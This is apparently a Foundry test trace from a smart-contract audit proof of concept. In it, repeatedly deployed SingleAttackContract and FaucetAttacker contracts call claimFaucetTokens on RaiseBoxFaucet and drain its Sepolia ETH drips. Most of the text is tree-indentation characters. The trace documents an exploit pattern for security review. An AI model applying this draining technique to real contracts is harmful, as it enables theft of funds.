    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6549380] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6541722] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 675000000000000000 [6.75e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xdd014c9a3d935177334a94fb9BF8969E9c3Bf7D3
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 65) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6284338] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6283579] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6247411] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6239753] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 670000000000000000 [6.7e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x626bF19e49CAc4398dB00875D3C7a37e087268aF
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 66) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5982369] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5981610] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5945442] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [5937784] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
